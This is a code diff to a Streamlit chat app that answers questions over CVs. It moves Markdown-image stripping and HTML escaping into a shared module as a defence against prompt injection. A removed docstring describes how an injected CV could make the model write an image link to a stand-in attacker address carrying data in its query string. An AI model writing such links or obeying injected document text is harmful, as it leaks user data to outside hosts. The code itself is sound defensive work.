@@ -5,7 +5,7 @@ import streamlit as st
 
 from cv_chat import config
 from cv_chat.rag import qa
-from cv_chat.ui import details
+from cv_chat.ui import details, safe
 
 ROUTE_NOTES = {
     "chat": "Answered without searching the CVs",
@@ -79,10 +79,10 @@ def _answer(question: str) -> None:
             with st.status("Reading your question...", expanded=True) as status:
                 stream, sources, route, trace = qa.ask(
                     question, history, expand=st.session_state.get("expand_queries", False),
-                    cache_answers=st.session_state.get("cache_answers", False), on_step=st.write
+                    cache_answers=st.session_state.get("cache_answers", False), on_step=lambda step: st.write(safe.esc(step))
                 )
                 status.update(label="Done", state="complete", expanded=False)
-            answer = st.write_stream(_no_images(stream))
+            answer = st.write_stream(safe.no_images(stream))
         except Exception as error:
             st.error(f"Could not answer: {str(error).splitlines()[0]}", icon=":material/error:")
             return
@@ -93,20 +93,6 @@ def _answer(question: str) -> None:
         {"role": "user", "content": question},
         {"role": "assistant", "content": answer, "sources": sources, "route": route, "trace": record},
     ]
-
-
-def _no_images(stream):
-    """Pass the answer through with Markdown image syntax turned into a plain link. The answer is written by a model that
-    reads CV text, so an injected CV could make it write ![x](https://attacker/?q=...), and drawing that would make the
-    browser load the address. A "!" at the end of a piece is held back until the next piece shows whether a "[" follows."""
-    held = ""
-    for piece in stream:
-        text, held = held + piece, ""
-        if text.endswith("!"):
-            text, held = text[:-1], "!"
-        yield text.replace("![", "[")
-    if held:
-        yield held
 
 
 def _route_note(route: str | None) -> None:
@@ -123,6 +109,6 @@ def _sources(sources: list[dict]) -> None:
         excerpts.setdefault(source["file_name"], []).append(source.get("caption") or source["content"])
     with st.expander(f"Sources · {len(excerpts)} CV{'' if len(excerpts) == 1 else 's'}", icon=":material/menu_book:"):
         for file_name, contents in excerpts.items():
-            st.markdown(f":material/description: **{details.esc(file_name)}** · {len(contents)} excerpt{'' if len(contents) == 1 else 's'}")
+            st.markdown(f":material/description: **{safe.esc(file_name)}** · {len(contents)} excerpt{'' if len(contents) == 1 else 's'}")
             snippet = " ".join(contents[0].split())
-            st.caption(details.esc(snippet[:240]) + ("..." if len(snippet) > 240 else ""))
+            st.caption(safe.esc(snippet[:240]) + ("..." if len(snippet) > 240 else ""))
